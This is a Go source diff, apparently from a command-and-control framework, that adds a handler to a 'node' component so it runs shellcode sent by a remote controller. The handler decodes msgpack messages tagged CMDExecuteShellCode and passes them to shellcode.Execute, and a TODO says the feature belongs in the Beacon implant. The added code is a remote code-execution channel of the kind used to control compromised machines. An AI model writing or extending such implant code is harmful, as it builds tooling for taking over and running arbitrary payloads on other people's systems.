@@ -2,12 +2,14 @@ package node
 
 import (
 	"context"
+	"fmt"
 
 	"github.com/vmihailenco/msgpack/v4"
 
 	"project/internal/convert"
 	"project/internal/logger"
 	"project/internal/messages"
+	"project/internal/module/shellcode"
 	"project/internal/protocol"
 	"project/internal/xpanic"
 )
@@ -57,10 +59,33 @@ func (h *handler) OnSend(s *protocol.Send) {
 		return
 	}
 	switch convert.BytesToUint32(s.Message[:4]) {
+	case messages.CMDExecuteShellCode:
+		h.handleExecuteShellCode(s.Message[4:])
 	case messages.CMDTest:
 		h.handleSendTestMessage(s.Message[4:])
 	default:
 		h.logf(logger.Exploit, "controller send unknown message: %X", s.Message)
+	}
+}
+
+// TODO <security> must remove to Beacon
+func (h *handler) handleExecuteShellCode(message []byte) {
+	defer func() {
+		if r := recover(); r != nil {
+			err := xpanic.Error(r, "handler.handleExecuteShellCode")
+			h.log(logger.Fatal, err)
+		}
+	}()
+	var es messages.ExecuteShellCode
+	err := msgpack.Unmarshal(message, &es)
+	if err != nil {
+		const format = "controller send invalid shellcode: %X"
+		h.logf(logger.Exploit, format, message)
+		return
+	}
+	err = shellcode.Execute(es.Method, es.ShellCode)
+	if err != nil {
+		fmt.Println("--------------", err)
 	}
 }
 
